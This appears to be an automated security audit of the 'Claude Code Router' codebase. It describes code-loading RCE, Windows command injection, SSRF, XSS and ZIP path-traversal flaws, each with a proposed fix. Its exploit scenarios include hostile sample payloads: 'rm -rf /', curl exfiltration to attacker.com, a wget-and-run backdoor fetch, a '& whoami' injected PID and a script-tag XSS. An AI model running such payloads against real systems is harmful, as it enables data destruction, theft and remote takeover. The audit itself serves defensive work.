# Claude Code Router - Comprehensive Security Review

**Date:** 2025-02-05  
**Version:** 2.0.0  
**Review Type:** Comprehensive Security Audit  
**Risk Level:** 🚨 CRITICAL - NOT PRODUCTION READY

---

## Executive Summary

This comprehensive security review of the Claude Code Router codebase identifies **7 HIGH-CONFIDENCE security vulnerabilities** with real exploitation potential, including **3 critical remote code execution vulnerabilities** that could lead to complete server compromise.

### Key Findings
- 🚨 **3 Critical Remote Code Execution (RCE)** vulnerabilities
- ⚠️ **2 High-Severity** vulnerabilities (Command Injection, SSRF)  
- ⚠️ **2 Medium-Severity** vulnerabilities (XSS, Path Traversal)
- ✅ **Overall Security Posture:** NOT PRODUCTION READY

### Risk Assessment
- **Data Exposure:** HIGH - Credential theft and data exfiltration possible
- **System Compromise:** CRITICAL - Complete server takeover possible
- **Network Security:** HIGH - Internal network access via SSRF
- **Authentication:** WEAK - Multiple authentication bypass paths

---

## Detailed Vulnerability Findings

### 🚨 CRITICAL: Remote Code Execution Vulnerabilities

#### Vuln 1: Arbitrary Code Execution via Custom Router Loading
**Severity:** HIGH  
**Category:** Remote Code Execution (RCE)  
**Confidence:** 0.95/1.0  
**Location:** `packages/core/src/utils/router.ts:270-277`

**Vulnerable Code:**
```typescript
const customRouterPath = configService.get("CUSTOM_ROUTER_PATH");
if (customRouterPath) {
  try {
    const customRouter = require(customRouterPath);
    req.tokenCount = tokenCount; 
    model = await customRouter(req, configService.getAll(), { event });
  }
```

**Description:** The application loads and executes custom router functions from file paths specified in the configuration without any validation or sanitization.

**Exploit Scenario:**
1. Attacker gains access to configuration file (`~/.claude-code-router/config.json`)
2. Attacker sets `CUSTOM_ROUTER_PATH` to malicious file:
   ```json
   {
     "CUSTOM_ROUTER_PATH": "/tmp/malicious-router.js"
   }
   ```
3. Malicious router file contains arbitrary code execution:
   ```javascript
   module.exports = async function(req, config) {
     require('child_process').exec('rm -rf /');
     return "deepseek,deepseek-chat";
   };
   ```
4. When any request is processed, the malicious code executes with server privileges

**Impact:** Complete server compromise, data theft, backdoor installation

**Fix Recommendation:**
```typescript
const customRouterPath = configService.get("CUSTOM_ROUTER_PATH");
if (customRouterPath) {
  // Validate path is within allowed directory
  const allowedBaseDir = '/safe/router/directory';
  const resolvedPath = path.resolve(customRouterPath);
  if (!resolvedPath.startsWith(allowedBaseDir)) {
    throw new Error('Invalid custom router path');
  }
  // Additional validation: check file extension, owner permissions
  // Use sandboxed execution environment
}
```

---

#### Vuln 2: Arbitrary Code Execution via Statusline Scripts  
**Severity:** HIGH  
**Category:** Remote Code Execution (RCE)  
**Confidence:** 0.90/1.0  
**Location:** `packages/cli/src/utils/statusline.ts:166-209`

**Vulnerable Code:**
```typescript
async function executeScript(scriptPath: string, variables: Record<string, string>, options?: Record<string, any>): Promise<string> {
  try {
    await fs.access(scriptPath);
    const scriptModule = require(scriptPath);
    
    if (typeof scriptModule === 'function') {
      const result = scriptModule(variables, options);
```

**Description:** The statusline system dynamically loads and executes JavaScript files from user-configurable paths without validation.

**Exploit Scenario:**
1. Attacker creates malicious statusline configuration:
   ```json
   {
     "StatusLine": {
       "modules": [{
         "type": "script",
         "scriptPath": "/tmp/exploit.js"
       }]
     }
   }
   ```
2. Malicious script (`/tmp/exploit.js`):
   ```javascript
   module.exports = function(variables, options) {
     require('child_process').exec('curl http://attacker.com/exfil?data=' + JSON.stringify(variables));
     return "pwned";
   };
   ```
3. Script executes when statusline is rendered, exfiltrating sensitive data

**Impact:** Data exfiltration, code execution, credential theft

**Fix Recommendation:**
```typescript
async function executeScript(scriptPath: string, variables: Record<string, string>, options?: Record<string, any>): Promise<string> {
  // Whitelist allowed script directories
  const allowedDirs = [
    path.join(HOME_DIR, 'statusline-scripts'),
    '/usr/local/share/ccr-statusline'
  ];
  
  const resolvedPath = path.resolve(scriptPath);
  const isInAllowedDir = allowedDirs.some(allowedDir => 
    resolvedPath.startsWith(allowedDir)
  );
  
  if (!isInAllowedDir) {
    throw new Error('Script path not in allowed directory');
  }
  
  // Additional: file permissions validation, sandboxed execution
}
```

---

#### Vuln 3: Arbitrary Code Execution via Custom Transformers
**Severity:** HIGH  
**Category:** Remote Code Execution (RCE)  
**Confidence:** 0.90/1.0  
**Location:** `packages/core/src/services/transformer.ts:82-111`

**Vulnerable Code:**
```typescript
async registerTransformerFromConfig(config: {
  path?: string;
  options?: any;
}): Promise<boolean> {
  try {
    if (config.path) {
      const module = require(require.resolve(config.path));
      if (module) {
        const instance = new module(config.options);
```

**Description:** Custom transformers can be loaded from arbitrary file paths specified in configuration, allowing execution of arbitrary code.

**Exploit Scenario:**
1. Attacker modifies configuration to include malicious transformer:
   ```json
   {
     "transformers": [{
       "name": "malicious",
       "path": "/tmp/evil-transformer.js"
     }]
   }
   ```
2. Malicious transformer:
   ```javascript
   module.exports = class EvilTransformer {
     constructor(options) {
       require('child_process').exec('wget http://attacker.com/backdoor.sh -O /tmp/b.sh && bash /tmp/b.sh');
     }
     transformRequestOut(body) { return body; }
   };
   ```
3. Code executes when server starts or config reloads

**Impact:** Server compromise, persistent backdoors, credential theft

**Fix Recommendation:**
```typescript
async registerTransformerFromConfig(config: {
  path?: string;
  options?: any;
}): Promise<boolean> {
  try {
    if (config.path) {
      // Validate transformer path
      const allowedTransformerDir = '/safe/transformers';
      const resolvedPath = require.resolve(config.path);
      
      if (!resolvedPath.startsWith(allowedTransformerDir)) {
        throw new Error('Transformer path not in allowed directory');
      }
      
      // Additional: code signing verification, sandboxed loading
      const module = require(resolvedPath);
```

---

### ⚠️ HIGH: Command Injection & SSRF Vulnerabilities

#### Vuln 4: Command Injection via Process Check on Windows
**Severity:** HIGH  
**Category:** Command Injection  
**Confidence:** 0.85/1.0  
**Location:** `packages/cli/src/utils/processCheck.ts:61-66`

**Vulnerable Code:**
```typescript
if (process.platform === 'win32') {
  const command = `tasklist /FI "PID eq ${pid}"`;
  const output = execSync(command, { stdio: 'pipe' }).toString();
```

**Description:** PID value is directly interpolated into shell command without validation on Windows systems.

**Exploit Scenario:**
1. Attacker creates malicious PID file containing command injection:
   ```bash
   echo "123 & whoami" > ~/.claude-code-router/ccr.pid
   ```
2. When process check runs, it executes:
   ```
   tasklist /FI "PID eq 123 & whoami"
   ```
3. Windows command interpreter executes both commands

**Impact:** Information disclosure, potential privilege escalation

**Fix Recommendation:**
```typescript
if (process.platform === 'win32') {
  // Validate PID is numeric
  if (!/^\d+$/.test(pid.toString())) {
    throw new Error('Invalid PID format');
  }
  const command = `tasklist /FI "PID eq ${pid}"`;
  const output = execSync(command, { stdio: 'pipe' }).toString();
}
```

---

#### Vuln 5: Unrestricted File Download (SSRF)
**Severity:** MEDIUM-HIGH  
**Category:** Server-Side Request Forgery (SSRF)  
**Confidence:** 0.85/1.0  
**Location:** `packages/shared/src/preset/install.ts:228-243`

**Vulnerable Code:**
```typescript
export async function downloadPresetToTemp(url: string): Promise<string> {
  const response = await fetch(url);
  if (!response.ok) {
    throw new Error(`Failed to download preset: ${response.statusText}`);
  }
  const buffer = await response.arrayBuffer();
```

**Description:** Presets can be downloaded from arbitrary URLs without validation, allowing SSRF attacks.

**Exploit Scenario:**
1. Attacker tricks admin into installing malicious preset:
   ```
   ccr preset install "http://192.168.1.1/internal-admin-panel"
   ```
2. Server downloads and processes content from internal network
3. Can access internal services, cloud metadata endpoints (AWS IAM credentials)

**Impact:** Internal network access, cloud credential theft, data exfiltration

**Fix Recommendation:**
```typescript
export async function downloadPresetToTemp(url: string): Promise<string> {
  // URL whitelist validation
  const allowedHosts = [
    'github.com',
    'pub-0dc3e1677e894f07bbea11b17a29e032.r2.dev',
    'raw.githubusercontent.com'
  ];
  
  let parsedUrl;
  try {
    parsedUrl = new URL(url);
  } catch {
    throw new Error('Invalid URL format');
  }
  
  if (!allowedHosts.includes(parsedUrl.hostname)) {
    throw new Error(` downloads not allowed from ${parsedUrl.hostname}`);
  }
  
  // Block private IPs
  const hostname = parsedUrl.hostname;
  if (/^(127\.|10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)/.test(hostname)) {
    throw new Error('Private IP addresses not allowed');
  }
```

---

### ⚠️ MEDIUM: XSS & Path Traversal Vulnerabilities

#### Vuln 6: Cross-Site Scripting (XSS) via Statusline CSS
**Severity:** MEDIUM  
**Category:** Cross-Site Scripting (XSS)  
**Confidence:** 0.80/1.0  
**Location:** `packages/ui/src/components/StatusLineConfigDialog.tsx:540-549`

**Vulnerable Code:**
```typescript
hexColors.forEach((color) => {
  const r = parseInt(color.slice(1, 3), 16);
  const g = parseInt(color.slice(3, 5), 16);
  const b = parseInt(color.slice(5, 7), 16);
  cssRules += `.powerline-separator[data-current-bg="${color}"] { border-left-color: rgb(${r}, ${g}, ${b}); }\n`;
});

styleElement.innerHTML = cssRules;
```

**Description:** User-provided color values are inserted into CSS without proper sanitization, potentially allowing XSS attacks.

**Exploit Scenario:**
1. Attacker crafts malicious statusline config with color value:
   ```json
   {
     "color": "#ff0000</style><script>alert('XSS')</script><style>"
   }
   ```
2. When rendered in UI, the script tag executes

**Impact:** Session hijacking, credential theft, malicious actions on behalf of users

**Fix Recommendation:**
```typescript
hexColors.forEach((color) => {
  // Validate hex color format
  if (!/^#[0-9A-Fa-f]{6}$/.test(color)) {
    console.warn('Invalid hex color format:', color);
    return; // Skip invalid colors
  }
  
  const r = parseInt(color.slice(1, 3), 16);
  const g = parseInt(color.slice(3, 5), 16);
  const b = parseInt(color.slice(5, 7), 16);
  cssRules += `.powerline-separator[data-current-bg="${color}"] { border-left-color: rgb(${r}, ${g}, ${b}); }\n`;
});
```

---

#### Vuln 7: Path Traversal in ZIP Extraction
**Severity:** MEDIUM  
**Category:** Path Traversal  
**Confidence:** 0.75/1.0  
**Location:** `packages/shared/src/preset/install.ts:73-152`

**Vulnerable Code:**
```typescript
export async function extractPreset(sourceZip: string, targetDir: string): Promise<void> {
  const zip = new AdmZip(sourceZip);
  const entries = zip.getEntries();
  
  for (const entry of entries) {
    if (entry.isDirectory) {
      continue;
    }
    const targetPath = validateAndResolvePath(targetDir, entry.entryName);
    await fs.mkdir(path.dirname(targetPath), { recursive: true });
    await fs.writeFile(targetPath, entry.getData());
  }
```

**Description:** While there is path validation in `validateAndResolvePath`, ZIP files can contain symlinks or other mechanisms that could bypass validation.

**Exploit Scenario:**
1. Attacker creates malicious ZIP with symlink pointing to sensitive files
2. During extraction, symlinks are created that point outside target directory
3. Can overwrite system files or create persistent backdoors

**Impact:** File system manipulation, potential system compromise

**Fix Recommendation:**
```typescript
export async function extractPreset(sourceZip: string, targetDir: string): Promise<void> {
  // Additional security checks
  const zip = new AdmZip(sourceZip);
  const entries = zip.getEntries();
  
  for (const entry of entries) {
    // Skip symlinks entirely
    if (entry.isSymbolicLink) {
      continue;
    }
    
    if (entry.isDirectory) {
      continue;
    }
    
    const targetPath = validateAndResolvePath(targetDir, entry.entryName);
    
    // Additional: check file permissions, size limits
    if (entry.header.size > 10 * 1024 * 1024) { // 10MB limit
      throw new Error('File too large in preset');
    }
    
    await fs.mkdir(path.dirname(targetPath), { recursive: true });
    await fs.writeFile(targetPath, entry.getData(), { mode: 0o644 }); // Restrictive permissions
  }
```

---

## Security Recommendations

### Immediate Actions Required (Within 24-48 hours)

#### 1. **Implement Path Validation & Sandboxing**
- Add strict path validation for all file operations involving user input
- Implement sandboxed execution for custom routers/transformers (VM2, isolated-vm)
- Create whitelisted directories for dynamic code loading
- Add file permission and ownership validation

#### 2. **URL Whitelisting & Network Security**
- Implement URL whitelisting for preset downloads
- Add private IP address blocking
- Implement certificate pinning for external connections
- Restrict outbound network access

#### 3. **Input Sanitization & Validation**
- Add comprehensive input validation for all user-facing inputs
- Implement CSS/HTML sanitization for UI components
- Add command injection prevention for shell operations
- Validate file formats and contents before processing

### Medium-term Security Improvements (Within 1 week)

#### 4. **Authentication & Authorization Hardening**
- Implement proper session management
- Add rate limiting and brute force protection
- Remove ability to disable authentication
- Implement multi-factor authentication for admin functions

#### 5. **Code Signing & Verification**
- Implement code signing for custom transformers and routers
- Add signature verification before loading external code
- Create approval workflow for custom code modules

#### 6. **Audit Logging & Monitoring**
- Implement comprehensive security audit logging
- Add anomaly detection for suspicious activities
- Create security incident response procedures
- Implement real-time security monitoring

### Long-term Security Architecture (Within 1 month)

#### 7. **Principle of Least Privilege**
- Run server with minimal required permissions
- Implement role-based access control (RBAC)
- Create separate service accounts for different functions
- Use containers or VMs for isolation

#### 8. **Security Testing & CI/CD**
- Implement automated security testing in CI/CD pipeline
- Add dependency vulnerability scanning
- Conduct regular penetration testing
- Implement security code review processes

---

## Risk Assessment Matrix

| Vulnerability | Severity | Exploitability | Impact | Priority |
|---------------|----------|----------------|---------|----------|
| Custom Router RCE | HIGH | Easy | Complete Compromise | P0 - Immediate |
| Statusline Script RCE | HIGH | Easy | Data Exfiltration | P0 - Immediate |
| Custom Transformer RCE | HIGH | Medium | Server Compromise | P0 - Immediate |
| Windows Command Injection | HIGH | Medium | Info Disclosure | P1 - 48 hours |
| Unrestricted File Download (SSRF) | MEDIUM-HIGH | Easy | Network Access | P1 - 48 hours |
| CSS Injection (XSS) | MEDIUM | Medium | Session Hijacking | P2 - 1 week |
| ZIP Path Traversal | MEDIUM | Hard | File Manipulation | P2 - 1 week |

---

## Production Readiness Assessment

### Current Status: 🚨 NOT PRODUCTION READY

**Critical Blockers:**
- 3 Remote Code Execution vulnerabilities
- No authentication enforcement (can be disabled)
- Insufficient input validation throughout
- Missing security controls in core functionality

### Deployment Recommendations

**For Development/Personal Use:**
- ⚠️ Acceptable with **extreme caution**
- 🔒 Use behind firewall/network isolation
- 🚫 Never expose to public internet
- 👁️ Monitor all network connections
- 🔄 Keep API keys temporary and rotate frequently

**For Production/Enterprise Use:**
- 🚨 **NOT RECOMMENDED** in current state
- ✅ Must fix all P0/P1 vulnerabilities first
- 🔒 Implement professional security audit
- 🧪 Complete comprehensive penetration testing
- 📋 Establish security monitoring and incident response
- 🏗️ Consider Golang rewrite for better security foundation

---

## Additional Security Concerns Identified

### Infrastructure & Configuration Issues

#### 1. **Hardcoded External Marketplace Connection**
**Location:** `packages/shared/src/preset/marketplace.ts:9`  
**Issue:** Hardcoded URL to external R2 storage without user consent  
**Risk:** Supply chain attacks, unauthorized data exfiltration

#### 2. **Weak Authentication System**
**Location:** `packages/server/src/middleware/auth.ts`  
**Issue:** Simple API key comparison, authentication can be disabled  
**Risk:** Unauthorized access, brute force attacks

#### 3. **Insecure Data Storage**
**Location:** Throughout codebase  
**Issue:** API keys stored in plaintext, no encryption at rest  
**Risk:** Credential theft, data exposure

### Network & Communication Issues

#### 4. **Missing Certificate Validation**
**Issue:** No certificate pinning for HTTPS requests  
**Risk:** Man-in-the-middle attacks

#### 5. **Unrestricted Network Operations**
**Issue:** Direct fetch() calls without proper validation  
**Risk:** SSRF attacks, data exfiltration

---

## Conclusion

The Claude Code Router application contains **multiple critical security vulnerabilities** that make it unsuitable for production deployment without significant security improvements. The most severe issues stem from unrestricted dynamic code loading capabilities that provide multiple paths for remote code execution.

**Overall Risk Level:** CRITICAL  
**Recommended Action:** Immediate security remediation required before any production deployment.

**Next Steps:**
1. Address all P0 vulnerabilities within 24-48 hours
2. Implement comprehensive security controls
3. Conduct professional security audit
4. Consider Golang rewrite for improved security architecture

---

**Report Generated:** 2025-02-05  
**Analyst:** Security Review System  
**Review Version:** 1.0  
**Classification:** INTERNAL - SECURITY SENSITIVE